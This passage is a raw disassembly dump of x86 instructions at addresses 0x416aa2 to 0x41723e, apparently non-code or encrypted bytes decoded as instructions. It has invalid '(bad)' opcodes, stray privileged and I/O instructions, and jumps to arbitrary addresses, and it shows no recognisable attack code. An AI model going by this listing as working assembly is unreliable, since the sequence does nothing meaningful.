  416aa2:	xchg   edi,eax
  416aa3:	ins    DWORD PTR es:[edi],dx
  416aa4:	retf   0x2555
  416aa7:	in     eax,dx
  416aa8:	(bad)  
  416aa9:	lock fisub DWORD PTR [ebx+0x18]
  416aad:	(bad)  
  416aae:	ficom  WORD PTR [ecx]
  416ab0:	mov    ebp,0xd422683e
  416ab5:	jle    0x416a8f
  416ab7:	jae    0x416a93
  416ab9:	push   ebx
  416aba:	std    
  416abb:	jo     0x416a6c
  416abd:	mov    edi,0x3daa7d6e
  416ac2:	adc    bh,BYTE PTR [edi]
  416ac4:	jecxz  0x416aea
  416ac6:	imul   ecx,DWORD PTR [edi+0x10],0xffffffeb
  416aca:	sahf   
  416acb:	add    ebp,DWORD PTR [ecx-0x1c6ac178]
  416ad1:	dec    ecx
  416ad2:	xor    BYTE PTR [edx+edi*2],0xe4
  416ad6:	(bad)  
  416ad7:	cmp    BYTE PTR [ebx],0x2
  416ada:	mov    ebp,0x2ff9d9e0
  416adf:	push   cs
  416ae0:	dec    ecx
  416ae1:	test   BYTE PTR [esi],0x32
  416ae4:	inc    ebx
  416ae5:	mov    eax,ds:0x2b7e709b
  416aea:	or     eax,0xae5acb73
  416aef:	jmp    0x465b6685
  416af4:	(bad)  
  416af5:	jnp    0x416b65
  416af7:	xor    ch,ah
  416af9:	sbb    bl,bh
  416afb:	push   eax
  416afc:	xchg   edx,eax
  416afd:	imul   ecx,DWORD PTR [edi-0x7225ec7f],0x937625cc
  416b07:	pusha  
  416b08:	xor    eax,0xd6a6a678
  416b0d:	mov    edx,0x565f96cf
  416b12:	mov    edx,0x7968ab80
  416b17:	rcr    DWORD PTR [edi-0x20de21ef],0x63
  416b1e:	test   DWORD PTR gs:[esi+0x20],esp
  416b22:	ins    BYTE PTR es:[edi],dx
  416b23:	pusha  
  416b24:	mov    edi,DWORD PTR [esi]
  416b26:	xchg   esi,eax
  416b27:	ret    0xa7ac
  416b2a:	xor    DWORD PTR es:[ecx+0x31],edx
  416b2e:	mov    edx,0x538e1a51
  416b33:	pop    esi
  416b34:	scas   al,BYTE PTR es:[edi]
  416b35:	mov    al,ds:0x924facee
  416b3a:	popf   
  416b3b:	je     0x416bac
  416b3d:	jle    0x416ae5
  416b3f:	push   0x1133463a
  416b44:	test   eax,0xefd7fa5c
  416b49:	mov    cl,0x9
  416b4b:	cmp    al,0xfb
  416b4d:	bound  edx,QWORD PTR [ebx-0x75b18db8]
  416b53:	fadd   st,st(5)
  416b55:	xor    bh,ch
  416b57:	in     al,0xc8
  416b59:	fsubr  DWORD PTR [ebx]
  416b5b:	dec    ebp
  416b5c:	cmp    DWORD PTR [esi],edx
  416b5e:	loope  0x416b22
  416b60:	mov    ah,0x58
  416b62:	pop    esi
  416b63:	mov    ch,0x83
  416b65:	or     eax,0xe4d03138
  416b6a:	jns    0x416be1
  416b6c:	inc    eax
  416b6d:	xchg   DWORD PTR [ecx-0x6a],edx
  416b70:	pop    es
  416b71:	sbb    BYTE PTR [edi-0x768fa074],dl
  416b77:	push   edi
  416b78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416b79:	fnstcw WORD PTR [ecx-0x42]
  416b7c:	dec    edx
  416b7d:	mov    cl,0x90
  416b7f:	xchg   ebp,eax
  416b80:	shl    DWORD PTR [edi-0x64],cl
  416b83:	repnz (bad) 
  416b85:	(bad)  
  416b86:	outs   dx,BYTE PTR ds:[esi]
  416b87:	stos   DWORD PTR es:[edi],eax
  416b88:	adc    al,0xfb
  416b8a:	cmp    dh,BYTE PTR [eax]
  416b8c:	mov    ch,0x57
  416b8e:	data16 mov al,0x5c
  416b91:	or     eax,0xd88d6a07
  416b96:	outs   dx,DWORD PTR ds:[esi]
  416b97:	ret    0xd62b
  416b9a:	push   ecx
  416b9b:	xchg   edi,eax
  416b9c:	dec    edx
  416b9d:	ins    BYTE PTR es:[edi],dx
  416b9e:	(bad)
  416ba1:	xchg   edi,eax
  416ba2:	sahf   
  416ba3:	(bad)  
  416ba4:	scas   eax,DWORD PTR es:[edi]
  416ba5:	in     eax,0x85
  416ba7:	pop    esi
  416ba8:	adc    bl,BYTE PTR [eax+ebp*8]
  416bab:	inc    esp
  416bac:	icebp  
  416bad:	test   ecx,esp
  416baf:	cmp    DWORD PTR [edi+esi*4-0x3f6ccf53],0x3e0a0cf8
  416bba:	cli    
  416bbb:	addr16 popf 
  416bbd:	push   edx
  416bbe:	(bad)  
  416bbf:	fsubr  st(5),st
  416bc1:	and    ebp,DWORD PTR [eax+edx*2-0xc3f53fb]
  416bc8:	shr    al,0x54
  416bcb:	sub    BYTE PTR [ecx-0x3b],0xd9
  416bcf:	je     0x416bb3
  416bd1:	push   cs
  416bd2:	mov    ebx,ss
  416bd4:	pop    edi
  416bd5:	jmp    0x416bbe
  416bd7:	jl     0x416bf3
  416bd9:	inc    eax
  416bda:	xchg   ebx,eax
  416bdb:	xchg   ebx,eax
  416bdc:	int    0x6b
  416bde:	xor    cl,BYTE PTR [ebp-0x21]
  416be1:	jge    0x416c55
  416be3:	out    dx,eax
  416be4:	ret    0x605
  416be7:	out    0xd4,eax
  416be9:	call   DWORD PTR [ecx]
  416beb:	mov    ebx,0x9589e994
  416bf0:	ret    
  416bf1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416bf2:	push   edx
  416bf3:	cdq    
  416bf4:	std    
  416bf5:	ret    0xb876
  416bf8:	add    BYTE PTR ds:0x6ad1394d,0x23
  416bff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416c00:	imul   ecx,esp,0xc6cde916
  416c06:	fidivr WORD PTR es:[esi+0x29]
  416c0a:	add    BYTE PTR [eax-0x63478af4],cl
  416c10:	(bad)  
  416c12:	test   al,0xc6
  416c14:	je     0x416bdf
  416c16:	hlt    
  416c17:	hlt    
  416c18:	and    al,0x14
  416c1a:	and    al,0xb6
  416c1c:	shl    BYTE PTR [ebx],1
  416c1e:	jns    0x416c14
  416c20:	pop    DWORD PTR [edi-0x42]
  416c23:	rol    DWORD PTR [edx-0x175ba4],1
  416c29:	data16 int 0x28
  416c2c:	pop    ecx
  416c2d:	push   0x1547554
  416c32:	nop
  416c33:	mov    bh,0x73
  416c35:	test   DWORD PTR [ecx+0xe],0x2a4c1554
  416c3c:	sbb    al,0x3b
  416c3e:	xor    eax,0x3e6f07e2
  416c43:	sbb    dl,cl
  416c45:	(bad)
  416c48:	lods   al,BYTE PTR ds:[esi]
  416c49:	scas   eax,DWORD PTR es:[edi]
  416c4a:	lahf   
  416c4b:	jp     0x416bf9
  416c4d:	push   ss
  416c4e:	add    eax,0xa4455bd8
  416c53:	ret    0x1711
  416c56:	add    DWORD PTR [edx+0x4d],ebp
  416c59:	mov    bh,0x93
  416c5b:	imul   eax,DWORD PTR [ebp+0x36],0x50
  416c5f:	cmp    BYTE PTR [edx],ch
  416c61:	(bad)  
  416c62:	jnp    0x416cbd
  416c64:	stc    
  416c65:	mov    bh,0xf6
  416c67:	xor    edi,DWORD PTR [eax]
  416c69:	out    dx,eax
  416c6a:	ret    
  416c6b:	in     al,0xac
  416c6d:	sbb    eax,0xa212e107
  416c72:	push   0x46
  416c74:	sub    cl,ah
  416c76:	test   al,0x15
  416c78:	aas    
  416c79:	xchg   DWORD PTR cs:[ebp-0x5c],esp
  416c7d:	cld    
  416c7e:	adc    ebx,ebp
  416c80:	pop    ecx
  416c81:	idiv   DWORD PTR gs:[ebx+ebx*1]
  416c85:	loope  0x416c5f
  416c87:	push   eax
  416c88:	addr16 pop esp
  416c8a:	(bad)  
  416c8b:	js     0x416c17
  416c8d:	dec    edx
  416c8e:	call   0x2d4a0e5d
  416c93:	bound  ebx,QWORD PTR [ebp+0x248829c9]
  416c99:	fadd   DWORD PTR [ebx]
  416c9b:	imul   edx,DWORD PTR [ecx],0x674bcdf2
  416ca1:	fs (bad) 
  416ca3:	stc    
  416ca4:	pop    ss
  416ca5:	mov    eax,ds:0x699ade37
  416caa:	pop    ecx
  416cab:	sub    esi,DWORD PTR [ebp+0x75]
  416cae:	iret   
  416caf:	fcmovb st,st(1)
  416cb1:	add    al,BYTE PTR [ebx+0x7a]
  416cb4:	adc    bh,BYTE PTR [ebx+edx*8-0x71]
  416cb8:	inc    ebx
  416cb9:	sahf   
  416cba:	lds    ebp,FWORD PTR [ebx+ecx*2]
  416cbd:	cmp    dh,dl
  416cbf:	fdiv   DWORD PTR [ecx]
  416cc1:	dec    ecx
  416cc2:	ror    BYTE PTR [ebx-0x33941f35],1
  416cc8:	repnz push 0xfffffff0
  416ccb:	fwait
  416ccc:	or     esp,ebx
  416cce:	ret    0x4dc8
  416cd1:	sti    
  416cd2:	add    BYTE PTR [eax-0x33e4f28c],0xa9
  416cd9:	into   
  416cda:	dec    ebx
  416cdb:	push   ss
  416cdc:	sbb    cl,BYTE PTR [esi-0x23280efe]
  416ce2:	inc    edx
  416ce3:	nop
  416ce4:	addr16 je 0x416cad
  416ce7:	sub    ebx,edx
  416ce9:	push   esp
  416cea:	les    ebp,FWORD PTR [edx+0x3f]
  416ced:	mov    al,ds:0x26e01fcf
  416cf2:	mov    bl,0x98
  416cf4:	dec    edi
  416cf5:	(bad)  
  416cf6:	mov    BYTE PTR [ecx-0x67],ch
  416cf9:	and    eax,0x35d8190e
  416cfe:	cwde   
  416cff:	pusha  
  416d00:	imul   esi,DWORD PTR [edi*4+0x21e3c100],0xfffffffb
  416d08:	aas    
  416d09:	xchg   ecx,eax
  416d0a:	lahf   
  416d0b:	mov    ah,0x33
  416d0d:	jle    0x416d1b
  416d0f:	scas   eax,DWORD PTR es:[edi]
  416d10:	aas    
  416d11:	cwde   
  416d12:	push   0x12d35f5b
  416d17:	pop    ss
  416d18:	pop    edx
  416d1a:	jno    0x416c9d
  416d1c:	add    DWORD PTR [eax],esi
  416d1e:	mov    WORD PTR [ecx],ss
  416d20:	sub    BYTE PTR [ecx],0x69
  416d23:	fistp  WORD PTR [ecx-0x30ca0ebc]
  416d29:	mov    ebp,0x3fa7a7f8
  416d2e:	pop    ss
  416d2f:	(bad)  
  416d30:	mov    eax,ds:0xedcdc5f5
  416d35:	jp     0x416d91
  416d37:	outs   dx,DWORD PTR gs:[esi]
  416d39:	hlt    
  416d3a:	ret    0xb0d9
  416d3d:	iret   
  416d3e:	into   
  416d3f:	fisubr WORD PTR [esp+eiz*4]
  416d42:	inc    esi
  416d43:	xchg   esi,eax
  416d44:	mov    ch,0x40
  416d46:	push   ebp
  416d47:	in     al,dx
  416d48:	pop    ebp
  416d49:	push   cs
  416d4a:	repz jg 0x416d52
  416d4d:	repnz push eax
  416d4f:	sysexit 
  416d51:	(bad)  
  416d52:	ds pop ds
  416d54:	retf   0x9463
  416d57:	and    DWORD PTR [edi],ecx
  416d59:	jle    0x416d7b
  416d5b:	xchg   ebp,edx
  416d5d:	cmp    eax,0x58614753
  416d62:	adc    BYTE PTR [esi-0x16],dh
  416d65:	repz sub al,BYTE PTR [eax+ecx*2-0x74f39b54]
  416d6d:	int    0xb7
  416d6f:	xchg   esp,eax
  416d70:	jae    0x416d3e
  416d72:	ins    DWORD PTR es:[edi],dx
  416d73:	dec    eax
  416d74:	lods   al,BYTE PTR ds:[esi]
  416d75:	adc    BYTE PTR [edi-0x2],bh
  416d78:	popf   
  416d79:	xchg   edx,eax
  416d7a:	ins    BYTE PTR es:[edi],dx
  416d7b:	cs into 
  416d7d:	jne    0x416daf
  416d7f:	or     ch,BYTE PTR [ebx]
  416d81:	and    esp,ebp
  416d83:	popf   
  416d84:	pop    ebp
  416d85:	mov    esi,0x5161d48d
  416d8a:	pop    ebx
  416d8b:	call   0x441e:0xfd15e881
  416d92:	jno    0x416e04
  416d94:	xor    ebp,DWORD PTR [ebp+0x5d]
  416d97:	xor    DWORD PTR [esi+0x431435bf],edx
  416d9d:	test   edi,esp
  416d9f:	jae    0x416deb
  416da1:	imul   ebp,DWORD PTR cs:[ecx],0xffffffa2
  416da5:	pop    ecx
  416da6:	sub    ch,BYTE PTR [edi+eax*1-0x4caaaa91]
  416dad:	pop    es
  416dae:	add    bh,BYTE PTR [esi+ebx*4]
  416db1:	xlat   BYTE PTR ds:[ebx]
  416db2:	or     BYTE PTR [edx+eiz*4],0x66
  416db6:	jne    0x416e28
  416db8:	loop   0x416e0a
  416dba:	dec    esi
  416dbb:	lock popf 
  416dbd:	push   es
  416dbe:	xor    cl,ch
  416dc0:	mov    al,0x54
  416dc3:	in     eax,0x26
  416dc5:	cmp    BYTE PTR [edi],cl
  416dc7:	sbb    eax,DWORD PTR [ecx+ebp*8+0x54f59e25]
  416dce:	hlt    
  416dcf:	cmp    DWORD PTR [eax],ecx
  416dd1:	in     al,dx
  416dd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416dd3:	imul   edi,DWORD PTR [ebx-0x23],0xe61c0b43
  416dda:	and    edi,DWORD PTR [edx-0x7df6c9ad]
  416de0:	inc    ecx
  416de1:	(bad)  
  416de2:	(bad)  
  416de4:	mov    ebp,0xe813e030
  416de9:	push   edi
  416dea:	inc    ebp
  416deb:	int3   
  416dec:	hlt    
  416ded:	cdq    
  416dee:	(bad)  
  416df0:	jp     0x416e2d
  416df2:	xchg   ebx,eax
  416df3:	mov    edi,0xb1e9628d
  416df8:	dec    ebx
  416df9:	scas   al,BYTE PTR es:[di]
  416dfb:	cs push edx
  416dfd:	sub    edi,DWORD PTR [edi+0x13]
  416e00:	xor    al,0xa4
  416e02:	inc    edx
  416e03:	fst    QWORD PTR [eax+0x4c5bfab]
  416e09:	jnp    0x416e2a
  416e0b:	test   al,0x97
  416e0d:	js     0x416dfb
  416e0f:	cmp    eax,0x1fb12d91
  416e14:	in     eax,0x4
  416e16:	(bad)  
  416e18:	es fwait
  416e1a:	fwait
  416e1b:	cdq    
  416e1c:	clc    
  416e1d:	je     0x416dc6
  416e1f:	rol    DWORD PTR [edi+0x40],cl
  416e22:	ss or  al,0xdc
  416e25:	les    ebp,FWORD PTR [ecx]
  416e27:	push   edx
  416e28:	xor    esi,DWORD PTR [edx]
  416e2a:	jmp    0xf548:0x28e27e1b
  416e31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e32:	and    esp,0x9920a8ed
  416e38:	cld    
  416e39:	jecxz  0x416e61
  416e3b:	push   0x1e985f54
  416e40:	cmp    eax,0xdfd0028b
  416e45:	pop    esp
  416e46:	dec    ebx
  416e47:	sbb    DWORD PTR [edi],esp
  416e49:	stos   DWORD PTR es:[edi],eax
  416e4a:	ins    DWORD PTR es:[edi],dx
  416e4b:	and    al,0x38
  416e4d:	arpl   WORD PTR [ebp-0x5b63bcff],bp
  416e53:	loopne 0x416dfe
  416e55:	cmc    
  416e56:	xchg   edx,eax
  416e57:	or     DWORD PTR [ebp+eax*4-0x3],esp
  416e5b:	xchg   edx,eax
  416e5c:	ds mov bl,0xfd
  416e5f:	xchg   esi,eax
  416e60:	adc    BYTE PTR [esi],bh
  416e62:	dec    edx
  416e63:	test   esi,edi
  416e65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e66:	(bad)  
  416e67:	inc    edx
  416e68:	cmp    al,0xbb
  416e6a:	pop    edi
  416e6b:	mov    dl,0xb9
  416e6d:	jb     0x416ee1
  416e6f:	cmc    
  416e70:	adc    BYTE PTR [eax],cl
  416e72:	lds    esi,FWORD PTR [ebx-0x54]
  416e75:	into   
  416e76:	(bad)  
  416e78:	es cmp eax,0xbb9860f5
  416e7e:	or     DWORD PTR [esi-0x2f34b9b5],edx
  416e84:	dec    esi
  416e85:	sbb    ch,BYTE PTR [ecx+0x1e]
  416e88:	mov    al,0xb3
  416e8a:	int3   
  416e8b:	push   cs
  416e8c:	xor    DWORD PTR [ebx-0x63af83ed],esp
  416e92:	lock lods al,BYTE PTR ds:[esi]
  416e94:	pop    esi
  416e95:	mov    eax,ds:0xa19bd086
  416e9a:	lods   eax,DWORD PTR ds:[esi]
  416e9b:	adc    ecx,eax
  416e9d:	mov    DWORD PTR [eax],ebp
  416e9f:	mov    bh,0x8b
  416ea1:	jae    0x416e49
  416ea3:	test   esp,ebp
  416ea5:	dec    edi
  416ea6:	and    BYTE PTR [esi+0x89cc8cd],ah
  416eac:	jge    0x416eb6
  416eae:	inc    esi
  416eaf:	xor    DWORD PTR ds:[bp+si+0x56],edi
  416eb4:	add    esp,DWORD PTR [eax+esi*1-0x7f]
  416eb8:	jmp    0x416e63
  416eba:	jmp    0xf1ac:0xd85bf727
  416ec1:	jecxz  0x416f26
  416ec3:	mov    ebp,0xbce4c560
  416ec8:	outs   dx,DWORD PTR ds:[esi]
  416ec9:	retf   
  416eca:	bound  edi,QWORD PTR [edi-0x987b5cb]
  416ed0:	mov    bh,0xe2
  416ed2:	mov    edx,0xa12f773f
  416ed7:	pop    eax
  416ed8:	out    dx,al
  416ed9:	cdq    
  416eda:	aad    0x30
  416edc:	and    eax,0x77622d8f
  416ee1:	enter  0xa254,0x96
  416ee5:	cmp    eax,0xb9f21be6
  416eea:	push   edi
  416eeb:	jg     0x416e72
  416eed:	mov    edx,0x4b5418ad
  416ef2:	mov    ebx,0xaa3b5801
  416ef7:	mov    ds,edx
  416ef9:	dec    eax
  416efa:	arpl   sp,sp
  416efc:	scas   al,BYTE PTR es:[edi]
  416efd:	(bad)  
  416efe:	retf   
  416eff:	xchg   DWORD PTR [ebp+0x13],edi
  416f02:	xor    BYTE PTR [ebx],0x4e
  416f05:	dec    ecx
  416f06:	pop    esp
  416f07:	stos   BYTE PTR es:[edi],al
  416f08:	lock loope 0x416eb8
  416f0b:	test   DWORD PTR [eax+0x1c],eax
  416f0e:	jns    0x416f3e
  416f10:	sub    al,0xb5
  416f12:	sub    dl,BYTE PTR [ebp-0x80]
  416f15:	sub    bh,ah
  416f17:	sbb    DWORD PTR [ebx+ecx*1-0x154cc2b9],0xffffffdf
  416f1f:	add    cl,BYTE PTR [edx-0x2d]
  416f22:	lea    edi,[eax+0x21]
  416f25:	repz and al,ch
  416f28:	inc    ebp
  416f29:	stc    
  416f2a:	ror    BYTE PTR [edx+0x37e0346],cl
  416f30:	sar    esp,cl
  416f32:	mov    bl,0xa
  416f34:	(bad)
  416f37:	retf   
  416f38:	adc    ch,BYTE PTR [ebx+0x58]
  416f3b:	cmp    bl,BYTE PTR [ebx]
  416f3d:	add    al,0x96
  416f3f:	adc    DWORD PTR [ebx+0x15],edi
  416f42:	scas   eax,DWORD PTR es:[edi]
  416f43:	push   esp
  416f44:	sub    ecx,eax
  416f46:	sub    esp,ebx
  416f48:	mov    eax,0x5544677e
  416f4d:	jne    0x416fc6
  416f4f:	sar    esp,1
  416f51:	mov    esi,DWORD PTR [edi-0x4048087c]
  416f57:	(bad)  
  416f58:	sbb    eax,0x84dea47a
  416f5d:	outs   dx,BYTE PTR ds:[esi]
  416f5e:	out    dx,eax
  416f5f:	iret   
  416f60:	jecxz  0x416f42
  416f62:	pop    ebp
  416f63:	or     eax,0xb3bd06c7
  416f68:	mov    WORD PTR [ebx-0x4a],ds
  416f6b:	ins    BYTE PTR es:[edi],dx
  416f6c:	(bad)  
  416f6d:	sbb    edx,DWORD PTR [ecx+eiz*8+0x64]
  416f71:	sub    DWORD PTR [ebx],edi
  416f73:	ja     0x416fe6
  416f75:	xor    ebx,DWORD PTR [eax]
  416f77:	add    bh,0x6f
  416f7a:	pushf  
  416f7b:	dec    esp
  416f7c:	and    al,0xf7
  416f7e:	add    BYTE PTR [eax],al
  416f80:	add    BYTE PTR [eax],al
  416f82:	push   ebp
  416f83:	sub    al,0x5f
  416f85:	test   DWORD PTR [edi-0x9],edi
  416f88:	(bad)  
  416f8a:	adc    dh,BYTE PTR [ecx+0x828f626]
  416f90:	and    eax,0xed3d0f
  416f95:	add    ah,dh
  416f97:	add    al,0x0
  416f99:	add    BYTE PTR [edi],ch
  416f9b:	adc    BYTE PTR [eax-0x59cfcdb1],ah
  416fa1:	jmp    0xb9eb3650
  416fa6:	pop    ds
  416fa7:	test   eax,0x8479bd32
  416fac:	loop   0x416f34
  416fae:	outs   dx,DWORD PTR ds:[esi]
  416faf:	xor    al,0x88
  416fb1:	shl    esi,cl
  416fb3:	into   
  416fb4:	inc    esi
  416fb5:	sub    eax,0x4175b2f
  416fba:	cmc    
  416fbb:	js     0x417004
  416fbd:	sbb    dh,BYTE PTR [eax]
  416fbf:	or     dh,bh
  416fc1:	and    edx,DWORD PTR [ecx-0x6]
  416fc4:	out    dx,eax
  416fc5:	jbe    0x416f88
  416fc7:	shr    eax,0x61
  416fca:	ret    
  416fcb:	retf   0x7bb5
  416fce:	aaa    
  416fcf:	bswap  edx
  416fd1:	push   ds
  416fd2:	xchg   BYTE PTR [ebp+0x77],cl
  416fd5:	je     0x416f60
  416fd7:	xor    BYTE PTR [ebx+0x3e],ch
  416fda:	mov    al,0x89
  416fdc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416fdd:	retf   
  416fde:	shl    DWORD PTR ss:[eax-0xe34db28],1
  416fe5:	out    0x24,eax
  416fe7:	push   ebx
  416fe8:	fimul  DWORD PTR [esi]
  416fea:	in     al,0x1f
  416fec:	mov    cl,0x28
  416fee:	fidivr DWORD PTR [ecx-0x3f]
  416ff1:	mov    BYTE PTR [edx+0x4ec1a57b],ch
  416ff7:	popa   
  416ff8:	mov    cl,0xfb
  416ffa:	loope  0x416f84
  416ffc:	sbb    DWORD PTR [edx-0x63],ebx
  416fff:	stos   DWORD PTR es:[edi],eax
  417000:	adc    DWORD PTR [edx],ebp
  417002:	adc    al,0x66
  417004:	outs   dx,DWORD PTR ds:[esi]
  417005:	lahf   
  417006:	movntps XMMWORD PTR [edi+esi*8+0x76],xmm6
  41700b:	pop    es
  41700c:	stos   BYTE PTR es:[edi],al
  41700d:	or     eax,0xfb748fb6
  417012:	mov    ds:0x4dbffa12,eax
  417017:	or     eax,0x88de717a
  41701c:	jae    0x417009
  41701e:	neg    BYTE PTR [eax+0x50dd6fa0]
  417024:	mov    bh,0x49
  417026:	pop    ecx
  417027:	pop    esp
  417028:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417029:	or     ebp,DWORD PTR [eax]
  41702b:	mov    WORD PTR [ebx],fs
  41702d:	mov    ecx,0xa9486fb1
  417032:	ret    0xc9b4
  417035:	inc    esi
  417036:	mov    edi,eax
  417038:	aam    0xb
  41703a:	xchg   DWORD PTR [eax-0x53],eax
  41703d:	out    dx,eax
  41703e:	fisubr WORD PTR [eax]
  417040:	push   0x79
  417042:	stos   DWORD PTR es:[edi],eax
  417043:	arpl   WORD PTR [edi],dx
  417045:	sub    bh,BYTE PTR [ecx-0x15]
  417048:	mov    ds:0xbcfed9bb,al
  41704d:	or     eax,0xbd8a8b45
  417052:	les    eax,FWORD PTR [ebx+0xc56c9da]
  417058:	ret    0xeb83
  41705b:	xchg   DWORD PTR [edi-0xd56fdac],esp
  417061:	lock addr16 cwde 
  417064:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417065:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417066:	ins    DWORD PTR es:[edi],dx
  417067:	retf   0xbd87
  41706a:	push   esp
  41706b:	push   edi
  41706c:	mov    edi,0x8f210072
  417071:	mov    bh,0x46
  417073:	push   0x8c94ce0f
  417078:	mov    ebp,0xfd6dc547
  41707d:	adc    DWORD PTR [ebx+0x35],0xffffffdd
  417081:	lock sub edi,DWORD PTR [eax]
  417084:	jmp    0x175e:0xc4f674a0
  41708b:	inc    ebx
  41708c:	or     edx,DWORD PTR [edx+0x593621ad]
  417092:	cmp    al,0xac
  417094:	push   eax
  417095:	clc    
  417096:	fxch   st(1)
  417098:	stc    
  417099:	xor    eax,0x55a3cf9e
  41709e:	mov    bh,0x4c
  4170a0:	push   es
  4170a1:	mov    es,WORD PTR [ebx+0x4f]
  4170a4:	sar    DWORD PTR [edi-0x20],0x51
  4170a8:	lds    esp,FWORD PTR [esi]
  4170aa:	adc    ebx,esi
  4170ac:	fwait
  4170ad:	jle    0x41709c
  4170af:	lds    edi,FWORD PTR [edi-0x44e5eaab]
  4170b5:	sbb    al,0xc8
  4170b7:	sbb    al,0xe3
  4170b9:	inc    edx
  4170ba:	adc    eax,0x9be4e409
  4170bf:	cmp    eax,0xb4c14334
  4170c4:	push   0x6f
  4170c6:	xor    DWORD PTR [eax],edx
  4170c8:	out    dx,al
  4170c9:	(bad)  
  4170ca:	ins    DWORD PTR es:[edi],dx
  4170cb:	xor    al,0xcb
  4170cd:	xor    BYTE PTR [esi],ah
  4170cf:	fisttp DWORD PTR [ebx]
  4170d1:	jnp    0x417057
  4170d3:	sar    DWORD PTR [ebx-0x7996f98],0xe5
  4170da:	jnp    0x417147
  4170dc:	xchg   edi,eax
  4170dd:	lods   al,BYTE PTR ds:[esi]
  4170de:	and    eax,0xfcb49bff
  4170e3:	mov    cl,0x4e
  4170e5:	push   ebx
  4170e6:	add    eax,0x149e2fb3
  4170eb:	arpl   WORD PTR [edx],bp
  4170ed:	rol    BYTE PTR [edx],cl
  4170ef:	inc    ebp
  4170f0:	out    0xb6,al
  4170f2:	ficom  WORD PTR [esi-0x6a83553]
  4170f8:	mov    eax,ds:0xe007d799
  4170fd:	mov    ebx,0x1843d749
  417102:	jp     0x417131
  417104:	inc    esi
  417105:	test   eax,0x72ddeb0b
  41710a:	ins    BYTE PTR es:[edi],dx
  41710b:	jne    0x4170b9
  41710d:	ja     0x4170c0
  41710f:	mov    eax,ds:0x7b722395
  417114:	jnp    0x41709f
  417116:	mov    ecx,0x7aeb7e22
  41711b:	sti    
  41711c:	shr    bl,1
  41711e:	ss push esp
  417120:	rol    DWORD PTR [edi],0x6e
  417123:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417124:	nop
  417125:	jnp    0x417145
  417127:	and    edx,0x30271037
  41712d:	cwde   
  41712e:	xchg   DWORD PTR [edi],eax
  417130:	and    al,0xc5
  417132:	jb     0x41714b
  417134:	jo     0x4170e7
  417136:	and    DWORD PTR [ebp-0x5],0x7cc9aa6e
  41713d:	mov    edx,eax
  41713f:	or     BYTE PTR [ecx],cl
  417141:	fwait
  417142:	or     eax,0x64a906f1
  417147:	xor    DWORD PTR [esi+0x44],0x4e
  41714b:	and    BYTE PTR [ecx+ebp*2-0x46588234],dh
  417152:	(bad)  
  417153:	mov    ecx,0xdc916efb
  417158:	or     al,cl
  41715a:	xor    DWORD PTR [edi-0x3c5efd87],eax
  417160:	mov    bl,0xb2
  417162:	pop    esi
  417163:	dec    ebp
  417164:	mov    eax,0x55150545
  417169:	mov    ecx,0x13bc5d6f
  41716e:	std    
  41716f:	jecxz  0x4171e9
  417171:	jns    0x417133
  417173:	inc    edi
  417174:	jmp    0x4171e9
  417176:	dec    eax
  417177:	pushf  
  417178:	push   edx
  417179:	pop    esi
  41717a:	cmp    eax,DWORD PTR [eax]
  41717c:	jmp    0xedea0d53
  417181:	iret   
  417182:	cmp    eax,0x920a1207
  417187:	cmp    bh,al
  417189:	jge    0x417125
  41718b:	arpl   WORD PTR ds:0x38684d3a,si
  417191:	loope  0x41716e
  417193:	(bad)  
  417194:	push   ss
  417195:	cmp    ebx,edx
  417197:	sar    ch,1
  417199:	out    0x5c,eax
  41719b:	inc    esi
  41719c:	std    
  41719d:	cli    
  41719e:	icebp  
  41719f:	jp     0x417213
  4171a1:	xor    al,0x5
  4171a3:	sub    cl,BYTE PTR [edi-0x50201e3d]
  4171a9:	mov    ebp,0xa7707d9
  4171ae:	stc    
  4171af:	xor    al,0xe4
  4171b1:	nop
  4171b2:	push   es
  4171b3:	jle    0x4171b0
  4171b5:	int3   
  4171b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4171b7:	scas   eax,DWORD PTR es:[edi]
  4171b8:	sub    ah,BYTE PTR [ebx+edi*4-0x5c62041f]
  4171bf:	(bad)  [edi]
  4171c1:	adc    eax,0x6c7d92fa
  4171c6:	mov    dl,0x23
  4171c8:	ds push edi
  4171ca:	jbe    0x417182
  4171cc:	arpl   WORD PTR [ebp-0x24ee447f],di
  4171d2:	jge    0x41717c
  4171d4:	pop    ss
  4171d5:	fimul  WORD PTR [ecx+0x54]
  4171d8:	jmp    0x1d8b:0x7d3d4ca4
  4171df:	(bad)  
  4171e0:	mov    ebx,0x657694bd
  4171e5:	lahf   
  4171e6:	mov    ecx,0xfaaebc8b
  4171eb:	cmc    
  4171ec:	sbb    BYTE PTR [edx+0x5558995f],bl
  4171f2:	dec    edx
  4171f3:	inc    edx
  4171f4:	loope  0x4171ac
  4171f6:	imul   ebx,DWORD PTR [edx+0x10da35d8],0x262f6b76
  417200:	push   esp
  417201:	xchg   DWORD PTR [ebx+0x7d],ebx
  417204:	inc    ebx
  417205:	xor    dh,cl
  417207:	je     0x41721c
  417209:	push   ecx
  41720a:	jmp    0x6b1759f9
  41720f:	sub    eax,0xa57c606a
  417214:	mov    dl,0x99
  417216:	cli    
  417217:	xchg   edi,eax
  417218:	(bad)  
  417219:	imul   ecx,DWORD PTR [edi],0xffffffaa
  41721c:	les    esp,FWORD PTR [ebp+ebx*8-0x35]
  417220:	xcrypt-ctr (bad)
  417221:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417222:	pop    edi
  417223:	pop    ebx
  417224:	jecxz  0x417212
  417226:	sbb    DWORD PTR [esi-0x76097a69],edx
  41722c:	mov    dl,0x6d
  41722e:	pusha  
  41722f:	fs sub al,0xf3
  417232:	or     al,BYTE PTR [edi+0x15]
  417235:	retf   0x6582
  417238:	and    dh,bh
  41723a:	popf   
  41723b:	leave  
  41723c:	(bad)  
  41723d:	aas    
  41723e:	cmp    ecx,DWORD PTR [edx]
